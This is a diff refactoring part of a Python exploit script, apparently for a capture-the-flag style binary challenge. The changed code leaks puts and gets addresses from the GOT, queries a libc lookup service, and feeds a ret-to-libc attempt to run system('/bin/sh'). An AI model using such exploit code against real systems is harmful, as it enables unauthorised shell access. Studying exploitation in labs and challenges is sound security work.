@@ -102,14 +102,14 @@ def skip_lines(proc, lines):
             proc.recvline()
         except EOFError:
             pass
-   
-# Get an array of all the potential libc versions that fit the puts and gets offsets provided
-def findPotentialLibcs(puts_addr,getsAddr):
-    data = {"symbols": {"puts": hex(puts_addr),"gets": hex(getsAddr)}}
+
+def find_potential_libcs(puts_addr,gets_addr):
+    """
+    Retrieves potential libc versions matching given offsets.
+    """
+    data = {"symbols": {"puts": hex(puts_addr),"gets": hex(gets_addr)}}
     response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
-    responseJson = response.json()
-    log.success(f"Retrieved potential libc versions for puts: {hex(puts_addr)} and gets: {hex(getsAddr)}")
-    return responseJson
+    return response.json()
 
 # Find the offsets of functions and '/bin/sh' from the current libc json
 def getLibcSymbolOffsets(libcJson):
@@ -136,8 +136,8 @@ def getLibcSymbolOffsets(libcJson):
 
 def main():
     puts_addr = leak_via_puts(conn,port,gotPuts)
-    getsAddr = leak_via_puts(conn,port,gotGets,msg="gets")
-    responseJson = findPotentialLibcs(puts_addr,getsAddr)
+    gets_addr = leak_via_puts(conn,port,gotGets,msg="gets")
+    responseJson = find_potential_libcs(puts_addr,gets_addr)
 
     # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
     for item in responseJson:
